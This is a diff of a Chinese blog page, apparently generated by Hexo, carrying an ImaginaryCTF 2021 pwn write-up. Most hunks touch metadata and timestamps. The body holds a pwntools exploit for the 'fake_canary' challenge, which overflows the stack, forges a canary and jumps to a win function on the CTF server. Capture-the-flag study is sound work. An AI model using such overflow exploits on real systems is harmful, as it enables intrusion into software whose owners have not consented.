@@ -15,16 +15,18 @@
 
 
 
-<meta name="description" content="title: imaginaryctf2021–pwn-wpcategories: [CTF]tags: [wp,pwn]  又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）">
+<meta name="description" content="又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）">
 <meta property="og:type" content="article">
 <meta property="og:title" content="imaginaryctf2021--pwn-wp">
 <meta property="og:url" content="lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/index.html">
 <meta property="og:site_name" content="lexsd6&#39;s home">
-<meta property="og:description" content="title: imaginaryctf2021–pwn-wpcategories: [CTF]tags: [wp,pwn]  又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）">
+<meta property="og:description" content="又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-07-28T15:40:37.640Z">
-<meta property="article:modified_time" content="2021-07-28T16:20:34.823Z">
+<meta property="article:modified_time" content="2021-07-28T16:26:48.020Z">
 <meta property="article:author" content="lexsd6">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
@@ -304,7 +306,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">9分</span>
+        <span class="post-count">8分</span>
       </span>
     </span>
 </div>
@@ -314,8 +316,17 @@
       
       <div class="article-info article-info-post">
         
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+
+        
+    <div class="article-tag tagcloud" >
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
         <div class="clearfix"></div>
       </div>
       
@@ -323,10 +334,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <hr>
-<p>title: imaginaryctf2021–pwn-wp<br>categories: [CTF]<br>tags: [wp,pwn]</p>
-<hr>
-<p>又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）</p>
+        <p>又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）</p>
 <a id="more"></a>
 <h2 id="fake-canary"><a href="#fake-canary" class="headerlink" title="fake_canary"></a>fake_canary</h2><p>题目没有看canary，但自己写了类似canary的功能。通过栈溢出在类似canary填上伪造canary即可。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'./fake_canary'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42002</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400608 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400536 : ret</span></span><br><span class="line"><span class="string">0x0000000000400542 : ret 0x200a</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>*<span class="number">5</span>+p64(<span class="number">0xDEADBEEF</span>)+p64(e.symbols[<span class="string">'win'</span>])+p64(<span class="number">0x00000000000400729</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -369,7 +377,7 @@
         <p><span>本文标题:</span><a href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021--pwn-wp</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
         <p><span>发布时间:</span>2021-07-28, 23:40:37</p>
-        <p><span>最后更新:</span>2021-07-29, 00:20:34</p>
+        <p><span>最后更新:</span>2021-07-29, 00:26:48</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2021/07/28/imaginaryctf2021--pwn-wp/" title="imaginaryctf2021--pwn-wp">lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/</a>
             <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
